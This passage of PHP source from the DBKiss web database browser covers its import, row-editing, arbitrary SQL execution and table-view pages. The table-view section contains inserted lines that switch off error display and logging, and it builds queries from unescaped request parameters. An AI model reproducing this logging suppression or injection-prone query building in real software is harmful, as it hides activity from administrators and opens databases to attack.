	<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
	<html>
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=<?php echo $page_charset;?>">
		<title><?php echo $db_name_h1?$db_name_h1:$db_name;?> &gt; Import</title>
		<link rel="shortcut icon" href="<?php echo $_SERVER['PHP_SELF']; ?>?dbkiss_favicon=1">
	</head>
	<body>

	<?php layout(); ?>
	<h1><a class=blue style="<?php echo $db_name_style;?>" href="<?php echo $_SERVER['PHP_SELF'];?>"><?php echo $db_name_h1?$db_name_h1:$db_name;?></a> &gt; Import</h1>
	<?php conn_info(); ?>

	<?php $files = sql_files(); ?>

	<?php if (count($files)): ?>
		<form action="<?php echo $_SERVER['PHP_SELF'];?>" method="post">
		<table class="none" cellspacing="0" cellpadding="0">
		<tr>
			<td>SQL file:</th>
			<td><select name="sqlfile"><option value="" selected="selected"></option><?php echo options($files);?></select></td>
			<td><input type="checkbox" name="ignore_errors" id="ignore_errors" value="1"></td>
			<td><label for="ignore_errors">ignore errors</label></td>
			<td><input type="checkbox" name="transaction" id="transaction" value="1"></td>
			<td><label for="transaction">transaction</label></td>
			<td><input type="checkbox" name="force_myisam" id="force_myisam" value="1"></td>
			<td><label for="force_myisam">force myisam</label></td>
			<td><input type="text" size="5" name="query_start" value=""></td>
			<td>query start</td>
			<td><input type="submit" value="Import"></td>
		</tr>
		</table>
		</form>
		<br>
	<?php else: ?>
		No sql files found in current directory.
	<?php endif; ?>

	<?php powered_by(); ?>

	</body></html>

<?php exit; endif; ?>
<?php if ('editrow' == get('action')): ?>
<?php
	function dbkiss_filter_id($id)
	{
		if (preg_match('#^[_a-z][a-z0-9_\-]*$#i', $id)) {
			return $id;
		}
		return false;
	}

	$get = get(array(
		'table' => 'string',
		'pk' => 'string',
		'id' => 'string'
	));

	$get['table'] = html_once($get['table']);
	$get['pk'] = html_once($get['pk']);

	$title_edit = sprintf('Edit row (%s=%s)', $get['pk'], $get['id']);
	$title = ' &gt; '.$get['table'].' &gt; '.$title_edit;

	if (!dbkiss_filter_id($get['table'])) {
		error('Invalid table name');
	}
	if (!dbkiss_filter_id($get['pk'])) {
		error('Invalid pk');
	}

	$row = false;

	if (!error())
	{
		$table_enq = quote_table($get['table']);
		$test = db_row("SELECT * FROM $table_enq");
		if ($test) {
			if (!array_key_exists($get['pk'], $test)) {
				error('Invalid pk');
			}
		}
		if (!error())
		{
			$table_enq = quote_table($get['table']);
			$query = db_bind("SELECT * FROM $table_enq WHERE {$get['pk']} = %0", $get['id']);
			$query = db_limit($query, 0, 2);
			$rows = db_list($query);
			if (count($rows) > 1) {
				error('Invalid pk: found more than one row with given id');
			} else if (count($rows) == 0) {
				error('Row not found');
			} else {
				$row = $rows[0];
				$row_id = $row[$get['pk']];
			}
		}
	}

	if ($row) {
		$types = table_types2($get['table']);
	}

	$edit_actions_assoc = array(
		'update' => 'Update',
		'update_pk' => 'Overwrite pk',
		'insert' => 'Copy row (insert)',
		'delete' => 'Delete'
	);

	$edit_action = post('dbkiss_action');

	if ($_ENV['IS_GET'])
	{
		$edit_action = array_first_key($edit_actions_assoc);
		$post = $row;
	}

	if ($_ENV['IS_POST'])
	{
		if (!array_key_exists($edit_action, $edit_actions_assoc)) {
			$edit_action = '';
			error('Invalid action');
		}

		$post = array();
		foreach ($row as $k => $v) {
			if (array_key_exists($k, $_POST)) {
				$val = (string) $_POST[$k];
				if ('null' == $val) {
					$val = null;
				}
				if ('int' == $types[$k]) {
					if (!strlen($val)) {
						$val = null;
					}
					if (!(preg_match('#^-?\d+$#', $val) || is_null($val))) {
						error('%s: invalid value', $k);
					}
				}
				if ('float' == $types[$k]) {
					if (!strlen($val)) {
						$val = null;
					}
					$val = str_replace(',', '.', $val);
					if (!(is_numeric($val) || is_null($val))) {
						error('%s: invalid value', $k);
					}
				}
				if ('time' == $types[$k]) {
					if (!strlen($val)) {
						$val = null;
					}
					if ('now' == $val) {
						$val = date_now();
					}
				}
				$post[$k] = $val;
			} else {
				error('Missing key: %s in POST', $k);
			}
		}

		if ('update' == $edit_action)
		{
			if ($post[$get['pk']] != $row[$get['pk']]) {
				if (count($row) != 1) { // Case: more than 1 column
					error('%s: cannot change pk on UPDATE', $get['pk']);
				}
			}
		}
		if ('update_pk' == $edit_action)
		{
			if ($post[$get['pk']] == $row[$get['pk']]) {
				error('%s: selected action Overwrite pk, but pk value has not changed', $get['pk']);
			}
		}
		if ('insert' == $edit_action)
		{
			if (strlen($post[$get['pk']])) {
				$table_enq = quote_table($get['table']);
				$test = db_row("SELECT * FROM $table_enq WHERE {$get['pk']} = %0", array($post[$get['pk']]));
				if ($test) {
					error('%s: there is already a record with that id', $get['pk']);
				}
			}
		}

		if (!error())
		{
			$post2 = $post;
			if ('update' == $edit_action)
			{
				if (count($row) != 1) { // Case: more than 1 column
					unset($post2[$get['pk']]);
				}
				db_update($get['table'], $post2, array($get['pk'] => $row_id));
				if (db_error()) {
					error('<font color="red"><b>DB error</b></font>: '.db_error());
				} else {
					if (count($row) == 1) { // Case: only 1 column
						redirect_ok(url(self(), array('id'=>$post[$get['pk']])), 'Row updated');
					} else {
						redirect_ok(self(), 'Row updated');
					}
				}
			}
			if ('update_pk' == $edit_action)
			{
				@db_update($get['table'], $post2, array($get['pk'] => $row_id));
				if (db_error()) {
					error('<font color="red"><b>DB error</b></font>: '.db_error());
				} else {
					$url = url(self(), array('id' => $post[$get['pk']]));
					redirect_ok($url, 'Row updated (pk overwritten)');
				}
			}
			if ('insert' == $edit_action)
			{
				$new_id = false;
				if (!strlen($post2[$get['pk']])) {
					unset($post2[$get['pk']]);
				} else {
					$new_id = $post2[$get['pk']];
				}
				@db_insert($get['table'], $post2);
				if (db_error()) {
					error('<font color="red"><b>DB error</b></font>: '.db_error());
				} else {
					if (!$new_id) {
						$new_id = db_insert_id($get['table'], $get['pk']);
					}
					$url = url(self(), array('id'=>$new_id));
					$msg = sprintf('Row inserted (%s=%s)', $get['pk'], $new_id);
					redirect_ok($url, $msg);
				}
			}
			if ('delete' == $edit_action)
			{
				$table_enq = quote_table($get['table']);
				@db_exe("DELETE FROM $table_enq WHERE {$get['pk']} = %0", $get['id']);
				if (db_error()) {
					error('<font color="red"><b>DB error</b></font>: '.db_error());
				} else {
					redirect_ok(self(), 'Row deleted');
				}
			}
		}
	}

	?>
<?php layout_start($title_edit); ?>
	<h1><span style="<?php echo $db_name_style;?>"><?php echo $db_name_h1?$db_name_h1:$db_name;?></span><?php echo $title;?></h1>

	<?php echo error();?>

	<?php if ($row): ?>

		<form action="<?php echo self();?>" method="post">

		<?php echo radio_assoc($edit_action, $edit_actions_assoc, 'dbkiss_action');?></td>
		<br>

		<table cellspacing="1" class="ls ls2">
		<?php foreach ($post as $k => $v): if (is_null($v)) { $v = 'null'; } $v = htmlspecialchars($v); ?>
			<tr>
				<th><?php echo $k;?>:</th>
				<td>
					<?php if ('int' == $types[$k]): ?>
						<input type="text" name="<?php echo $k;?>" value="<?php echo html_once($v);?>" size="11">
					<?php elseif ('char' == $types[$k]): ?>
						<input type="text" name="<?php echo $k;?>" value="<?php echo html_once($v);?>" size="50">
					<?php elseif (in_array($types[$k], array('text', 'mediumtext', 'longtext')) || str_has($types[$k], 'blob')): ?>
						<textarea name="<?php echo $k;?>" cols="80" rows="<?php echo $k=='notes'?10:10;?>"><?php echo html_once($v);?></textarea>
					<?php else: ?>
						<input type="text" name="<?php echo $k;?>" value="<?php echo html_once($v);?>" size="30">
					<?php endif; ?>
				</td>
				<td valign="top"><?php echo $types[$k];?></td>
			</tr>
		<?php endforeach; ?>
		<tr>
			<td colspan="3" class="none">
				<input type="submit" wait="1" block="1" class="button" value="Edit">
			</td>
		</tr>
		</table>

		</form>

	<?php endif; ?>

	<?php layout_end(); ?>

<?php exit; endif; ?>
<?php if (isset($_GET['execute_sql']) && $_GET['execute_sql']): ?>
<?php

function listing($base_query, $md5_get = false)
{
	global $db_driver, $db_link;

	$md5_i = false;
	if ($md5_get) {
		preg_match('#_(\d+)$#', $md5_get, $match);
		$md5_i = $match[1];
	}

	$base_query = trim($base_query);
	$base_query = str_cut_end($base_query, ';');

	$query = $base_query;
	$ret = array('msg'=>'', 'error'=>'', 'data_html'=>false);
	$limit = 25;
	$offset = get('offset','int');
	$page = floor($offset / $limit + 1);

	if ($query) {
		if (is_select($query) && !preg_match('#\s+LIMIT\s+\d+#i', $query) && !preg_match('#into\s+outfile\s+#', $query)) {
			$query = db_limit($query, $offset, $limit);
		} else {
			$limit = false;
		}
		$time = time_start();
		if (!db_is_safe($query, true)) {
			$ret['error'] = 'Detected UPDATE/DELETE without WHERE condition (put WHERE 1=1 if you want to execute this query)';
			return $ret;
		}
		$rs = @db_query($query);
		if ($rs) {
			if ($rs === true) {
				if ('mysql' == $db_driver)
				{
					$affected = mysql_affected_rows($db_link);
					$time = time_end($time);
					$ret['data_html'] = '<b>'.$affected.'</b> rows affected.<br>Time: <b>'.$time.'</b> sec';
					return $ret;
				}
			} else {
				if ('pgsql' == $db_driver)
				{
					$affected = @pg_affected_rows($rs);
					if ($affected || preg_match('#^\s*(DELETE|UPDATE)\s+#i', $query)) {
						$time = time_end($time);
						$ret['data_html'] = '<p><b>'.$affected.'</b> rows affected. Time: <b>'.$time.'</b> sec</p>';
						return $ret;
					}
				}
			}

			$rows = array();
			while ($row = db_row($rs)) {
				$rows[] = $row;
				if ($limit) {
					if (count($rows) == $limit) { break; }
				}
			}
			db_free($rs);

			if (is_select($base_query)) {
				$found = @db_one("SELECT COUNT(*) FROM ($base_query) AS sub");
				if (!is_numeric($found) || (count($rows) && !$found)) {
					global $COUNT_ERROR;
					$COUNT_ERROR = ' (COUNT ERROR) ';
					$found = count($rows);
				}
			} else {
				if (count($rows)) {
					$found = count($rows);
				} else {
					$found = false;
				}
			}
			if ($limit) {
				$pages = ceil($found / $limit);
			} else {
				$pages = 1;
			}
			$time = time_end($time);

		} else {
			$ret['error'] = db_error();
			return $ret;
		}
	} else {
		$ret['error'] = 'No query found.';
		return $ret;
	}

	ob_start();
?>
	<?php if (is_numeric($found)): ?>
		<p>
			Found: <b><?php echo $found;?></b><?php echo isset($GLOBALS['COUNT_ERROR'])?$GLOBALS['COUNT_ERROR']:'';?>.
			Time: <b><?php echo $time;?></b> sec.
			<?php
				$params = array('md5'=>$md5_get, 'offset'=>get('offset','int'));
				if (get('only_marked') || post('only_marked')) { $params['only_marked'] = 1; }
				if (get('only_select') || post('only_select')) { $params['only_select'] = 1; }
			?>
			/ <a href="<?php echo url(self(), $params);?>">Refetch</a>
			/ Export to CSV:&nbsp;
			
			<a href="<?php echo $_SERVER['PHP_SELF']; ?>?export=csv&separator=<?php echo urlencode('|');?>&query=<?php echo base64_encode($base_query); ?>">pipe</a>
			-
			<a href="<?php echo $_SERVER['PHP_SELF']; ?>?export=csv&separator=<?php echo urlencode("\t");?>&query=<?php echo base64_encode($base_query); ?>">tab</a>
			-
			<a href="<?php echo $_SERVER['PHP_SELF']; ?>?export=csv&separator=<?php echo urlencode(',');?>&query=<?php echo base64_encode($base_query); ?>">comma</a>
			-
			<a href="<?php echo $_SERVER['PHP_SELF']; ?>?export=csv&separator=<?php echo urlencode(';');?>&query=<?php echo base64_encode($base_query); ?>">semicolon</a>
		</p>
	<?php else: ?>
		<p>Result: <b>OK</b>. Time: <b><?php echo $time;?></b> sec</p>
	<?php endif; ?>

	<?php if (is_numeric($found)): ?>

		<?php if ($pages > 1): ?>
		<p>
			<?php if ($page > 1): ?>
				<?php $ofs = ($page-1)*$limit-$limit; ?>
				<?php
					$params = array('md5'=>$md5_get, 'offset'=>$ofs);
					if (get('only_marked') || post('only_marked')) { $params['only_marked'] = 1; }
					if (get('only_select') || post('only_select')) { $params['only_select'] = 1; }
				?>
				<a href="<?php echo url(self(), $params);?>">&lt;&lt; Prev</a> &nbsp;
			<?php endif; ?>
			Page <b><?php echo $page;?></b> of <b><?php echo $pages;?></b> &nbsp;
			<?php if ($pages > $page): ?>
				<?php $ofs = $page*$limit; ?>
				<?php
					$params = array('md5'=>$md5_get, 'offset'=>$ofs);
					if (get('only_marked') || post('only_marked')) { $params['only_marked'] = 1; }
					if (get('only_select') || post('only_select')) { $params['only_select'] = 1; }
				?>
				<a href="<?php echo url(self(), $params);?>">Next &gt;&gt;</a>
			<?php endif; ?>
		</p>
		<?php endif; ?>

		<script>
		function mark_row(tr)
		{
			var els = tr.getElementsByTagName('td');
			if (tr.marked) {
				for (var i = 0; i < els.length; i++) {
					els[i].style.backgroundColor = '';
				}
				tr.marked = false;
			} else {
				tr.marked = true;
				for (var i = 0; i < els.length; i++) {
					els[i].style.backgroundColor = '#ddd';
				}
			}
		}
		</script>

		<?php if ($found): ?>

			<?php
				$edit_table = table_from_query($base_query);
				if ($edit_table) {
					$edit_pk = array_first_key($rows[0]);
					if (is_numeric($edit_pk)) { $edit_table = false; }
				}
				if ($edit_table) {
					$types = table_types2($edit_table);
					if ($types && count($types)) {
						if (in_array($edit_pk, array_keys($types))) {
							if (!array_col_match_unique($rows, $edit_pk, '#^\d+$#')) {
								$edit_pk = guess_pk($rows);
								if (!$edit_pk) {
									$edit_table = false;
								}
							}
						} else {
							$edit_table = false;
						}
					} else {
						$edit_table = false;
					}
				}
				$edit_url = '';
				if ($edit_table) {
					$edit_url = url(self(true), array('action'=>'editrow', 'table'=>$edit_table, 'pk'=>$edit_pk, 'id'=>'%s'));
				}
			?>

			<table class="ls" cellspacing="1">
			<tr>
				<?php if ($edit_url): ?><th>#</th><?php endif; ?>
				<?php foreach ($rows[0] as $col => $v): ?>
					<th><?php echo $col;?></th>
				<?php endforeach; ?>
			</tr>
			<?php foreach ($rows as $row): ?>
			<tr ondblclick="mark_row(this)">
				<?php if ($edit_url): ?>
					<td><a href="javascript:void(0)" onclick="popup('<?php echo sprintf($edit_url, $row[$edit_pk]);?>', 620, 500)">Edit</a>&nbsp;</td>
				<?php endif; ?>
				<?php
					$count_cols = 0;
					foreach ($row as $v) { $count_cols++; }
				?>
				<?php foreach ($row as $k => $v): ?>
					<?php
						if (preg_match('#^\s*<a[^>]+>[^<]+</a>\s*$#iU', $v) && strlen(strip_tags($v)) < 50) {
							$v = strip_tags($v, '<a>');
							$v = create_links($v);
						} else {
							$v = strip_tags($v);
							$v = str_replace('&nbsp;', ' ', $v);
							$v = preg_replace('#[ ]+#', ' ', $v);
							$v = create_links($v);
							if (!get('full_content') && strlen($v) > 50) {
								if (1 == $count_cols) {
									$v = truncate_html($v, 255);
								} else {
									$v = truncate_html($v, 50);
								}
							}
							// $v = html_once($v); - create_links() disabling
						}
						$nl2br = get('nl2br');
						if (get('full_content')) {
							$v = str_wrap($v, 80, '<br>', true);
						}
						if (get('nl2br')) {
							$v = nl2br($v);
						}
						//$v = stripslashes(stripslashes($v));
						if (@$types[$k] == 'int' && (preg_match('#time#i', $k) || preg_match('#date#i', $k))
							&& preg_match('#^\d+$#', $v))
						{
							$tmp = @date('Y-m-d H:i', $v);
							if ($tmp) {
								$v = $tmp;
							}
						}
						global $post;
						if (str_has($post['sql'], '@gethostbyaddr') && (preg_match('#^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$#', $v))) {
							$v = $v.'<br>'.@gethostbyaddr($v);
						}
					?>
					<td onclick="mark_col(this)" <?php echo $nl2br?'valign="top"':'';?> nowrap><?php echo is_null($row[$k])?'-':$v;?></td>
				<?php endforeach; ?>
			</tr>
			<?php endforeach; ?>
			</table>

		<?php endif; ?>

		<?php if ($pages > 1): ?>
		<p>
			<?php if ($page > 1): ?>
				<?php $ofs = ($page-1)*$limit-$limit; ?>
				<?php
					$params = array('md5'=>$md5_get, 'offset'=>$ofs);
					if (get('only_marked') || post('only_marked')) { $params['only_marked'] = 1; }
					if (get('only_select') || post('only_select')) { $params['only_select'] = 1; }
				?>
				<a href="<?php echo url(self(), $params);?>">&lt;&lt; Prev</a> &nbsp;
			<?php endif; ?>
			Page <b><?php echo $page;?></b> of <b><?php echo $pages;?></b> &nbsp;
			<?php if ($pages > $page): ?>
				<?php $ofs = $page*$limit; ?>
				<?php
					$params = array('md5'=>$md5_get, 'offset'=>$ofs);
					if (get('only_marked') || post('only_marked')) { $params['only_marked'] = 1; }
					if (get('only_select') || post('only_select')) { $params['only_select'] = 1; }
				?>
				<a href="<?php echo url(self(), $params);?>">Next &gt;&gt;</a>
			<?php endif; ?>
		</p>
		<?php endif; ?>

	<?php endif; ?>

<?php
	$cont = ob_get_contents();
	ob_end_clean();
	$ret['data_html'] = $cont;
	return $ret;
}

?>
<?php

	// ----------------------------------------------------------------
	// EXECUTE SQL
	// ----------------------------------------------------------------

	set_time_limit(0);

	$template = get('template');
	$msg = '';
	$error = '';
	$top_html = '';
	$data_html = '';

	$get = get(array(
		'popup'=> 'int',
		'md5' => 'string',
		'only_marked' => 'bool',
		'only_select' => 'bool'
	));
	$post = post(array(
		'sql' => 'string',
		'perform' => 'string',
		'only_marked' => 'bool',
		'only_select' => 'bool',
		'save_as' => 'string',
		'load_from' => 'string'
	));

	if ($get['md5']) {
		$get['only_select'] = true;
		$post['only_select'] = true;
	}

	if ($get['only_marked']) { $post['only_marked'] = 1; }
	if ($get['only_select']) { $post['only_select'] = 1; }

	$sql_dir = false;
	if (defined('DBKISS_SQL_DIR')) {
		$sql_dir = DBKISS_SQL_DIR;
	}

	if ($sql_dir) {
		if (!(dir_exists($sql_dir) && is_writable($sql_dir))) {
			if (!dir_exists($sql_dir) && is_writable('.')) {
				mkdir($sql_dir);
			} else {
				exit('You must create "'.$sql_dir.'" directory with write permission.');
			}
		}
		if (!file_exists($sql_dir.'/.htaccess')) {
			file_put($sql_dir.'/.htaccess', 'deny from all');
		}
		if (!file_exists($sql_dir.'/index.html')) {
			file_put($sql_dir.'/index.html', '');
		}
	}

	if ('GET' == $_SERVER['REQUEST_METHOD']) {
		if ($sql_dir)
		{
			if ($get['md5'] && preg_match('#^(\w{32,32})_(\d+)$#', $get['md5'], $match)) {
				$md5_i = $match[2];
				$md5_tmp = sprintf($sql_dir.'/zzz_%s.dat', $match[1]);
				$post['sql'] = file_get($md5_tmp);
				$_SERVER['REQUEST_METHOD'] = 'POST';
				$post['perform'] = 'execute';
			} else if ($get['md5'] && preg_match('#^(\w{32,32})$#', $get['md5'], $match)) {
				$md5_tmp = sprintf($sql_dir.'/zzz_%s.dat', $match[1]);
				$post['sql'] = file_get($md5_tmp);
				$get['md5'] = '';
			} else {
				if ($get['md5']) {
					trigger_error('invalid md5', E_USER_ERROR);
				}
			}
		}
	} else {
		$get['md5'] = '';
	}

	if (str_has($post['sql'], '@nl2br')) {
		$_GET['nl2br'] = 1;
	}
	if (str_has($post['sql'], '@full_content')) {
		$_GET['full_content'] = 1;
	}

	$post['sql'] = trim($post['sql']);
	$md5 = md5($post['sql']);
	$md5_file = sprintf($sql_dir.'/zzz_%s.dat', $md5);
	if ($sql_dir && $post['sql']) {
		file_put($md5_file, $post['sql']);
	}

	if ($sql_dir && 'save' == $post['perform'] && $post['save_as'] && $post['sql'])
	{
		$post['save_as'] = str_replace('.sql', '', $post['save_as']);
		if (preg_match('#^[\w ]+$#', $post['save_as'])) {
			$file = $sql_dir.'/'.$post['save_as'].'.sql';
			$overwrite = '';
			if (file_exists($file)) {
				$overwrite = ' - <b>overwritten</b>';
				$bak = $sql_dir.'/zzz_'.$post['save_as'].'_'.md5(file_get($file)).'.dat';
				copy($file, $bak);
			}
			$msg .= sprintf('<div>Sql saved: %s %s</div>', basename($file), $overwrite);
			file_put($file, $post['sql']);
		} else {
			error('Saving sql failed: only alphanumeric chars are allowed');
		}
	}

	if ($sql_dir) {
		$load_files = dir_read($sql_dir, null, array('.sql'), 'date_desc');
	}
	$load_assoc = array();
	if ($sql_dir) {
		foreach ($load_files as $file) {
			$file_path = $file;
			$file = basename($file);
			$load_assoc[$file] = '('.substr(file_date($file_path), 0, 10).')'.' ' .$file;
		}
	}

	if ($sql_dir && 'load' == $post['perform'])
	{
		$file = $sql_dir.'/'.$post['load_from'];
		if (array_key_exists($post['load_from'], $load_assoc) && file_exists($file)) {
			$msg .= sprintf('<div>Sql loaded: %s (%s)</div>', basename($file), timestamp(file_date($file)));
			$post['sql'] = file_get($file);
			$post['save_as'] = basename($file);
			$post['save_as'] = str_replace('.sql', '', $post['save_as']);
		} else {
			error('<div>File not found: %s</div>', $file);
		}
	}

	// after load - md5 may change
	$md5 = md5($post['sql']);

	if ($sql_dir && 'load' == $post['perform'] && !error()) {
		$md5_tmp = sprintf($sql_dir.'/zzz_%s.dat', $md5);
		file_put($md5_tmp, $post['sql']);
	}

	$is_sel = false;

	$queries = preg_split("#;(\s*--[ \t\S]*)?(\r\n|\n|\r)#U", $post['sql']);
	foreach ($queries as $k => $query) {
		$query = query_strip($query);
		if (str_starts_with($query, '@')) {
			$is_sel = true;
		}
		$queries[$k] = $query;
		if (!trim($query)) { unset($queries[$k]); }
	}

	$sql_assoc = array();
	$sql_selected = false;
	$i = 0;

	$params = array(
		'md5' => $md5,
		'only_marked' => $post['only_marked'],
		'only_select' => $post['only_select'],
		'offset' => ''
	);
	$sql_main_url = url(self(), $params);

	foreach ($queries as $query) {
		$i++;
		$query = str_cut_start($query, '@');
		if (!is_select($query)) {
			continue;
		}
		$query = preg_replace('#\s+#', ' ', $query);
		$params = array(
			'md5' => $md5.'_'.$i,
			'only_marked' => $post['only_marked'],
			'only_select' => $post['only_select'],
			'offset' => ''
		);
		$url = url(self(), $params);
		if ($get['md5'] && $get['md5'] == $params['md5']) {
			$sql_selected = $url;
		}
		$sql_assoc[$url] = str_truncate(strip_tags($query), 80);
	}

	if ('POST' == $_SERVER['REQUEST_METHOD'])
	{
		if (!$post['perform']) {
			$error = 'No action selected.';
		}
		if (!$error)
		{
			$time = time_start();
			switch ($post['perform']) {
				case 'execute':
					$i = 0;
					db_begin();
					$commit = true;
					foreach ($queries as $query)
					{
						$i++;
						if ($post['only_marked'] && !$is_sel) {
							if (!$get['md5']) { continue; }
						}
						if ($is_sel) {
							if (str_starts_with($query, '@')) {
								$query = str_cut_start($query, '@');
							} else {
								if (!$get['md5']) { continue; }
							}
						}
						if ($post['only_select'] && !is_select($query)) {
							continue;
						}
						if ($get['md5'] && $i != $md5_i) {
							continue;
						}
						if ($get['md5'] && $i == $md5_i) {
							if (!is_select($query)) {
								trigger_error('not select query', E_USER_ERROR);
							}
						}

						$exec = listing($query, $md5.'_'.$i);
						$query_trunc = str_truncate(html_once($query), 1000);
						$query_trunc = query_color($query_trunc);
						$query_trunc = nl2br($query_trunc);
						$query_trunc = html_spaces($query_trunc);
						if ($exec['error']) {
							$exec['error'] = preg_replace('#error:#i', '', $exec['error']);
							$top_html .= sprintf('<div style="background: #ffffd7; padding: 0.5em; border: #ccc 1px solid; margin-bottom: 1em; margin-top: 1em;"><b style="color:red">Error</b>: %s<div style="margin-top: 0.25em;"><b>Query %s</b>: %s</div></div>', $exec['error'], $i, $query_trunc);
							$commit = false;
							break;
						} else {
							$query_html = sprintf('<div class="query"><b style="font-size: 10px;">Query %s</b>:<div style="'.$sql_font.' margin-top: 0.35em;">%s</div></div>', $i, $query_trunc);
							$data_html .= $query_html;
							$data_html .= $exec['data_html'];
						}
					}
					if ($commit) {
						db_end();
					} else {
						db_rollback();
					}
					break;
			}
			$time = time_end($time);
		}
	}

	if ($post['only_marked'] && !$is_sel) {
		error('No queries marked');
	}

?>
<?php layout_start(($db_name_h1?$db_name_h1:$db_name).' &gt; Execute SQL'); ?>
	<?php if ($get['popup']): ?>
		<h1><span style="<?php echo $db_name_style;?>"><?php echo $db_name_h1?$db_name_h1:$db_name;?></span> &gt; Execute SQL</h1>
	<?php else: ?>
		<h1><a class=blue style="<?php echo $db_name_style;?>" href="<?php echo $_SERVER['PHP_SELF'];?>"><?php echo $db_name_h1?$db_name_h1:$db_name;?></a> &gt; Execute SQL</h1>
	<?php endif; ?>

	<?php echo error();?>

	<script>
	function sql_submit(form)
	{
		if (form.perform.value.length) {
			return true;
		}
		return false;
	}
	function sql_execute(form)
	{
		form.perform.value='execute';
		form.submit();
	}
	function sql_preview(form)
	{
		form.perform.value='preview';
		form.submit();
	}
	function sql_save(form)
	{
		form.perform.value='save';
		form.submit();
	}
	function sql_load(form)
	{
		if (form.load_from.selectedIndex)
		{
			form.perform.value='load';
			form.submit();
			return true;
		}
		button_clear(form);
		return false;
	}
	</script>

	<?php if ($msg): ?>
		<div class="msg"><?php echo $msg;?></div>
	<?php endif; ?>

	<?php echo $top_html;?>

	<?php if (count($sql_assoc)): ?>
		<p>
			SELECT queries:
			<select name="sql_assoc" onchange="if (this.value.length) location=this.value">
				<option value="<?php echo html_once($sql_main_url);?>"></option>
				<?php echo options($sql_assoc, $sql_selected);?>
			</select>
		</p>
	<?php endif; ?>

	<?php if ($get['md5']): ?>
		<?php echo $data_html;?>
	<?php endif; ?>

	<form action="<?php echo $_SERVER['PHP_SELF'];?>?execute_sql=1&popup=<?php echo $get['popup'];?>" method="post" onsubmit="return sql_submit(this);" style="margin-top: 1em;">
	<input type="hidden" name="perform" value="">
	<div style="margin-bottom: 0.25em;">
		<textarea id="sql_area" name="sql" class="sql_area"><?php echo htmlspecialchars(query_upper($post['sql']));?></textarea>
	</div>
	<table cellspacing="0" cellpadding="0"><tr>
	<td nowrap>
		<input type="button" wait="1" class="button" value="Execute" onclick="sql_execute(this.form); ">
	</td>
	<td nowrap>
		&nbsp;
		<input type="button" wait="1" class="button" value="Preview" onclick="sql_preview(this.form); ">
	</td>
	<td nowrap>
		&nbsp;
		<input type="checkbox" name="only_marked" id="only_marked" value="1" <?php echo checked($post['only_marked'] || $get['only_marked']);?>>
	</td>
	<td nowrap>
		<label for="only_marked">only marked</label>
	</td>
	<td nowrap>
		&nbsp;
		<input type="checkbox" name="only_select" id="only_select" value="1" <?php echo checked($post['only_select'] || $get['only_select']);?>>
	</td>
	<td nowrap>
		<label for="only_select">only SELECT</label>
		&nbsp;&nbsp;&nbsp;
	</td>
	<td nowrap>
		<input type="text" name="save_as" value="<?php echo html_once($post['save_as']);?>">
		&nbsp;
	</td>
	<td nowrap>
		<input type="button" wait="1" class="button" value="Save" onclick="sql_save(this.form); ">
		&nbsp;&nbsp;&nbsp;
	</td>
	<td nowrap>
		<select name="load_from" style="width: 140px;"><option value=""></option><?php echo options($load_assoc);?></select>
		&nbsp;
	</td>
	<td nowrap>
		<input type="button" wait="1" class="button" value="Load" onclick="return sql_load(this.form);">
	</td>
	</tr></table>
	</form>

	<?php

		if ('preview' == $post['perform'])
		{
			echo '<h2>Preview</h2>';
			$i = 0;
			foreach ($queries as $query)
			{
				$i++;
				$query = str_cut_start($query, '@');
				$query = html_once($query);
				$query = query_color($query);
				$query = nl2br($query);
				$query = html_spaces($query);
				printf('<div class="query"><b style="font-size: 10px;">Query %s</b>:<div style="'.$sql_font.' margin-top: 0.35em;">%s</div></div>', $i, $query);
			}
		}

	?>

	<?php if (!$get['md5']): ?>
		<script>$('sql_area').focus();</script>
		<?php echo $data_html;?>
	<?php endif; ?>

	<?php layout_end(); ?>

<?php exit; endif; ?>
<?php if (isset($_GET['viewtable']) && $_GET['viewtable']): ?>

	<?php

		set_time_limit(0);
@ini_set('html_errors','0');
@ini_set('display_errors','0');
@ini_set('display_startup_errors','0');
@ini_set('log_errors','0');
		// ----------------------------------------------------------------
		// VIEW TABLE
		// ----------------------------------------------------------------

		$table = $_GET['viewtable'];
		$table_enq = quote_table($table);
		$count = db_one("SELECT COUNT(*) FROM $table_enq");

		$types = table_types2($table);
		$columns = table_columns($table);
		if (!count($columns)) {
			$columns = array_assoc(array_keys($types));
		}
		$columns2 = $columns;

		foreach ($columns2 as $k => $v) {
			$columns2[$k] = $v.' ('.$types[$k].')';
		}
		$types_group = table_types_group($types);
		$_GET['search'] = get('search');

		$where = '';
		$found = $count;
		if ($_GET['search']) {
			$search = $_GET['search'];
			$cols2 = array();

			if (get('column')) {
				$cols2[] = $_GET['column'];
			} else {
				$cols2 = $columns;
			}
			$where = '';
			$search = db_escape($search);

			$column_type = '';
			if (!get('column')) {
				$column_type = get('column_type');
			} else {
				$_GET['column_type'] = '';
			}

			$ignore_int = false;
			$ignore_time = false;

			foreach ($columns as $col)
			{
				if (!get('column') && $column_type) {
					if ($types[$col] != $column_type) {
						continue;
					}
				}
				if (!$column_type && !is_numeric($search) && str_has($types[$col], 'int')) {
					$ignore_int = true;
					continue;
				}
				if (!$column_type && is_numeric($search) && str_has($types[$col], 'time')) {
					$ignore_time = true;
					continue;
				}
				if (get('column') && $col != $_GET['column']) {
					continue;
				}
				if ($where) { $where .= ' OR '; }
				if (is_numeric($search)) {
					$where .= "$col = '$search'";
				} else {
					if ('mysql' == $db_driver) {
						$where .= "$col LIKE '%$search%'";
					} else if ('pgsql' == $db_driver) {
						$where .= "$col ILIKE '%$search%'";
					} else {
						trigger_error('db_driver not implemented');
					}
				}
			}
			if (($ignore_int || $ignore_time) && !$where) {
				$where .= ' 1=2 ';
			}
			$where = 'WHERE '.$where;
		}

		if ($where) {
			$table_enq = quote_table($table);
			$found = db_one("SELECT COUNT(*) FROM $table_enq $where");
		}

		$limit = 50;
		$offset = get('offset','int');
		$page = floor($offset / $limit + 1);
		$pages = ceil($found / $limit);

		$pk = table_pk($table);

		$order = "ORDER BY";
		if (get('order_by')) {
			$order .= ' '.$_GET['order_by'];
		} else {
			if ($pk) {
				$order .= ' '.$pk;
			} else {
				$order = '';
			}
		}
		if (get('order_desc')) { $order .= ' DESC'; }

		$table_enq = quote_table($table);
		$base_query = "SELECT * FROM $table_enq $where $order";
		$rs = db_query(db_limit($base_query, $offset, $limit));

